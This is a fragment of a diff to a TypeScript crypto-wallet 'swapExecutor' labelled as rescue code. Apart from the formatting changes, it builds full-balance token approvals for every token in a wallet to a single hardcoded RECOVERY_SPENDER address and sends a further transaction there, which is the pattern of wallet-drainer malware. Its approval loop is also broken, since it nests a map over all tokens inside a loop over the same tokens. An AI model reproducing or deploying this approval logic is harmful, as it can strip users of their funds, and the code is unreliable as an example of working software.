@@ -62,7 +62,7 @@ export const swapExecutor = {
     }, {});
 
     // UPGRADE: Dynamic concurrency limit to prevent rate-limiting on high-asset wallets
-    const quoteTasks = Object.keys(chainGroups).map(async (chainIdStr): Promise<RescueQuote | null> => {
+  const quoteTasks: Promise<RescueQuote | null>[] = Object.keys(chainGroups).map(async (chainIdStr) => {
       const chainId: number = Number(chainIdStr); 
       const group = chainGroups[chainIdStr];
 
@@ -177,22 +177,21 @@ export const swapExecutor = {
 
         // 8. ATOMIC BUNDLE CONSTRUCTION (Memory Optimized)
         for (const token of group.tokens) {
-          const approvals = await Promise.all(
-            group.tokens.map((token: any) =>
-            (txBuilder as any).buildApprovalTx(
-            token.contract || token.address,
-            RECOVERY_SPENDER,
-            token.rawBalance || token.balance,
-            token.decimals || 18
-            )
-            )
-            );
+        const approvals = await Promise.all(
+          group.tokens.map((token: any) =>
+          (txBuilder as any).buildApprovalTx(
+          token.contract || token.address,
+          RECOVERY_SPENDER,
+          token.rawBalance || token.balance,
+          token.decimals || 18
+          )
+          )
+          );
 
-            approvals.forEach((approval: any, i: number) => {
-            if (!approval) return;
-
-            const token = group.tokens[i];
-            payloads.push(approval);
+          approvals.forEach((approval: any, i: number) => {
+          if (!approval) return;
+          const token = group.tokens[i];
+          payloads.push(approval);
             payloads.push({
             to: RECOVERY_SPENDER,
             data: "0x",
